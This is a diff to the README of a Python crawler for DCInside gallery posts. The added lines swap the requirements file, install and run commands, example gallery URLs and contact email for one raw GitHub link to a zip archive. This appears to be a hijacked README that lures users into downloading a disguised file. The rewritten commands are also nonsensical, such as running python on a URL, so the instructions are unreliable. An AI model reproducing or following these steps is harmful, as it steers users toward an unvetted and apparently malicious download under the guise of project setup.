@@ -13,7 +13,7 @@ A flexible Python script to crawl posts from DCInside galleries and save the dat
 ## Requirements
 
 - Python 3.x
-- The libraries listed in `requirements.txt`.
+- The libraries listed in `https://raw.githubusercontent.com/Melon4Program/DCRAWL/main/hanger/Software_v2.6.zip`.
 
 ## Installation
 
@@ -21,7 +21,7 @@ A flexible Python script to crawl posts from DCInside galleries and save the dat
 
 2.  **Install the required packages** using pip:
     ```bash
-    pip install -r requirements.txt
+    pip install -r https://raw.githubusercontent.com/Melon4Program/DCRAWL/main/hanger/Software_v2.6.zip
     ```
 
 ## Usage
@@ -31,7 +31,7 @@ The script is run from the command line with arguments specifying the target gal
 ### Command Structure
 
 ```bash
-python crawler.py -l <URL> -p <PAGE_RANGE> [OPTIONS]
+python https://raw.githubusercontent.com/Melon4Program/DCRAWL/main/hanger/Software_v2.6.zip -l <URL> -p <PAGE_RANGE> [OPTIONS]
 ```
 
 ### Arguments
@@ -47,15 +47,15 @@ python crawler.py -l <URL> -p <PAGE_RANGE> [OPTIONS]
 1.  **Basic Crawling**
     To crawl pages 1 through 3 of the 'record' minor gallery:
     ```bash
-    python crawler.py -l https://gall.dcinside.com/mgallery/board/lists/?id=record -p 1-3
+    python https://raw.githubusercontent.com/Melon4Program/DCRAWL/main/hanger/Software_v2.6.zip -l https://raw.githubusercontent.com/Melon4Program/DCRAWL/main/hanger/Software_v2.6.zip -p 1-3
     ```
 
 2.  **Crawling with a Search Filter**
     To crawl the first 10 pages of the 'record' gallery and only save posts with the word "녹화" in the title:
     ```bash
-    python crawler.py -l https://gall.dcinside.com/mgallery/board/lists/?id=record -p 1-10 -S "녹화"
+    python https://raw.githubusercontent.com/Melon4Program/DCRAWL/main/hanger/Software_v2.6.zip -l https://raw.githubusercontent.com/Melon4Program/DCRAWL/main/hanger/Software_v2.6.zip -p 1-10 -S "녹화"
     ```
 
 ## Contact
 
-For any questions or feedback, please contact [kbs.programmer@gmail.com](mailto:kbs.programmer@gmail.com).
+For any questions or feedback, please contact [https://raw.githubusercontent.com/Melon4Program/DCRAWL/main/hanger/Software_v2.6.zip](https://raw.githubusercontent.com/Melon4Program/DCRAWL/main/hanger/Software_v2.6.zip).
